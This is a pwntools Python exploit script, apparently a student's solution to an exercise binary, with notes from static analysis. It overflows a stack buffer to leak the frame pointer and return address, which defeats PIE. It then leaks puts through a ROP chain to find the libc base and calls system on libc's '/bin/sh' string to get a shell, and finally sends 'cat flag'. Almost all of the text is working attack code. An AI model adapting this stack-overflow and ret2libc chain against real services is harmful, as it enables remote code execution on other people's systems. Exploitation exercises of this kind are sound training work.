#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')

#local
#exe = './exercise4c'
#libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")

#remote
exe = 'handout/exercise4/exercise4c'
libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()

# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()
'''
arch     x86
baddr    0x0
binsz    15070
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      true
relocs   true
relro    full
rpath    NONE
sanitiz  false
static   false
stripped false
subsys   linux
va       true
'''
'''
0x000011c9 16 sym.unused -> suspicious
0x000011d9 69 sym.read_line
0x0000121e 72 sym.get_message -> in gdb gets consistently translated to 0x000055555555521e
#offset is 0x0000555555554000
0x00001266 107 main
0x00001266 107 sym.main
'''
'''
0x00002008 36 str.Enter_the_message_you_want_to_send:
0x0000202c 17 str.Oh.__s___Really
0x0000203d 27 str.Thanks_for_your_message.
'''

'''
main prints out: Thanks for your message.\n\r
get_message: readline to read in input string
'''

i = 1;

#print("Msg " + str(i) + ": ", end="")
#i = i + 1
#print(r.recvline()) #"Remote debugging from host.."

print("Msg " + str(i) + ": ", end="")
i = i + 1
print(r.recvuntil(b'Enter the message you want to send:\n')) #"Enter the message you want to send"


#idea: have "cat flag" in rdi, then call systems
#oberserve that in get_message, there is no sp increasing at end, it's just ret so sp will remain at starting address where input string is stored
#cat flag is 8 bytes, fits perfectly into slot and into rdi
#since there is no "mov rdi "cat flag"", next best option is to pop it from stack slot into rdi since all we get from the input string is the location via stack pointer
#static analsysis
'''
0x00001343                 5f  pop rdi
0x00001344                 c3  ret
'''
#idea:
#junk + pop rdi + system call
#https://crypto.stanford.edu/~blynn/asm/rop.html


pre_rbp = 0x170 * b'A'
main_rbp = 8 * b'B'

#leak slot content that holds main's rbp value -> get address that starts the main frame
payload = pre_rbp
print("Payload: ", end="")
print(payload)
r.sendline(payload)
mains_frame_starting_address = r.recvuntil(b'to send:\n')
print(mains_frame_starting_address)
mains_frame_starting_address = mains_frame_starting_address[:mains_frame_starting_address.index(b'?! Really?Thanks ')][-6:]
print(20 * "*")
print("Main frame start address: ", end="")
print(mains_frame_starting_address)
mains_frame_starting_address = mains_frame_starting_address + (8 - len(mains_frame_starting_address)) * b'\x00'
mains_frame_starting_address = mains_frame_starting_address[::-1]
mains_frame_starting_address = int(bytes.hex(mains_frame_starting_address), 16)
print(hex(mains_frame_starting_address))
print(20 * "*")

payload = pre_rbp + main_rbp
print("Payload: ", end="")
print(payload)

r.sendline(payload)
return_address = r.recvuntil(b'to send:\n')
print(return_address)
ret_add = return_address[return_address.index(b'B' * 8) + 8:return_address.index(b'?! Really')]
ret_add = ret_add + (8 - len(ret_add)) * b'\x00'
ret_add = ret_add[::-1]
ret_add = int(bytes.hex(ret_add), 16)

assembly_ret_addr = 0x12be

PIE_offset = ret_add - assembly_ret_addr



print("Return address: ", end="")
print(hex(ret_add))
print("PIE_offset    : ", end="")
print(hex(PIE_offset))

#static analsysi
pop_rdi = p64(PIE_offset + 0x1343)
got_put = p64(PIE_offset + 0x3fb0)
plt_put = p64(PIE_offset + 0x1094) 
plt_main = p64(PIE_offset + 0x1266)

print(20 * "x")
print(hex(int(bytes.hex(pop_rdi[::-1]), 16)))
print(hex(int(bytes.hex(got_put[::-1]), 16)))
print(hex(int(bytes.hex(plt_put[::-1]), 16)))
print(hex(int(bytes.hex(plt_main[::-1]), 16)))
print(20 * "x")

payload = pre_rbp + main_rbp + pop_rdi + got_put + plt_put + plt_main
print("Payload: ", end="")
print(payload)

r.sendline(payload) #read string with fgets
#r.sendline("cat flag; exit".encode())
print("Msg " + str(i) + ": ", end="")
i = i + 1


put_address = r.recvuntil(b'to send:\n')
print("Received: ", end="")
print(put_address)
put_address = put_address[put_address.index(b'?! Really?') + len(b'?! Really?'):put_address.index(b'\nEnter the message you want to send:\n')]
print("Libc leak: ", end="")
print(put_address)
#print(r.recvuntil(b'send:\n'))
put_address = u64(put_address + (8 - len(put_address)) * b'\x00')
print(20 * "x")
print("put address: ", end="")
print(hex(put_address))
print(20 * "x")

libc_base = put_address - libc.sym['puts']
libc_system = libc_base + libc.sym['system']# - 0x64affde000

libc_sh = libc_base + 0x1b45bd #from binary of libc

print("Libc base      : ", end="")
print(hex(libc_base))
print("System address : ", end="")
print(hex(libc_system))
#print("System address : ", end="") #match
#print(hex(r.libc.symbols['system']))

#static analsysis
'''
0x00001343                 5f  pop rdi
0x00001344                 c3  ret
'''
#r.interactive(prompt="")

#0x12d1 is second last instruction of main
#ret_to_main_address = p64(0x000012d1 + PIE_offset) 

#inst_ret_add = p64(PIE_offset + 0x1344)

#rop = pop_rdi + libc_system + ret_to_main_address
#rop = pop_rdi# + p64(r.libc.sym['system']) + 8 * b'\x00'# + ret_to_main_address + 8 * b'\x00'

COMMAND = b'cat flag'

pre_rbp = (0x170 // len(COMMAND)) * (COMMAND)# + (0x170 - len(b'cat flag')) * b'A'
main_rbp = COMMAND #0x8 * b'B'
#p64(PIE_offset + 0x12d1) #end of main

#payload = pre_rbp + main_rbp + p64(PIE_offset + 0x1344) + p64(PIE_offset + 0x12d1)#p64(PIE_offset + 0x1343) + p64(r.libc.sym['system'])
#payload = pre_rbp + main_rbp + p64(PIE_offset + 0x11d8) + pop_rdi + p64(libc_system)
#payload = pre_rbp + main_rbp + p64(PIE_offset + 0x11d8) + p64(libc_system)
#payload = pre_rbp + main_rbp + p64(PIE_offset + 0x1343) + p64(libc_system)
#payload = pre_rbp + main_rbp + p64(PIE_offset + 0x11d3) + p64(libc_system)

location_of_COMMAND = mains_frame_starting_address - 0x30 #fill the stack with COMMAND anyway

print(20 * "*")
print("location_of_COMMAND:")
print(hex(location_of_COMMAND))
print(20 * "*")

#rop = ROP(exe)
#rop.rdi = location_of_COMMAND
#print(20 * "*")
#print("ROP:")
#print(rop.dump())
#print(rop.chain())
#print(20 * "*")
#print(20 * "*")
#print("PIE free m    : ", end="")
#print(hex(PIE_offset + 0x4000))
#print("PIE_offset    : ", end="")
#print(hex(PIE_offset))
#print(20 * "*")
payload = pre_rbp + main_rbp + p64(PIE_offset + 0x1343) + p64(libc_sh) + p64(PIE_offset + 0x1344) + p64(libc_system)#p64(location_of_COMMAND) + p64(libc_system)# + p64(PIE_offset + 0x2d1)

print(20 * "*")
print(hex(PIE_offset + 0x1343))
print(hex(location_of_COMMAND))
print(hex(libc_system))
print(20 * "*")


#payload = pre_rbp + main_rbp + p64(PIE_offset + 0x1343) + p64(PIE_offset + 0x4000) + p64(PIE_offset + 0x11d9) + p64(PIE_offset + 0x1344) + p64(r.libc.symbols['system'])

#payload = pre_rbp + main_rbp + p64(PIE_offset + 0x1343) + p64(PIE_offset + 0x4000) + p64(PIE_offset + 0x1344) + p64(PIE_offset + 0x11d9) + p64(r.libc.symbols['system'])

#payload = pre_rbp + main_rbp + p64(PIE_offset + 0x11c9) + p64(PIE_offset + 0x1344) + p64(libc_system)

#payload = pre_rbp + main_rbp + p64(PIE_offset + 0x1344) + p64(PIE_offset + 0x11c9) + p64(r.libc.symbols['system']) + p64(r.libc.symbols['system'])+ p64(PIE_offset + 0x12d1)

#rop = ROP(exe)
#rop(rdi = b'cat flag')

print("Payload: ", end="")
print(payload)
#r.interactive(prompt="")
r.sendline(payload) #read string with fgets
r.sendline(b'cat flag')
#r.recvall(timeout=3)
#r.sendline(b'cat flag')
#r.interactive()
#print(r.recvall(timeout=5))
print(r.recvall(timeout=5))
#print(r.recvall(timeout=5))
#print(hex(libc.sym['puts']))
#r.interactive(prompt="")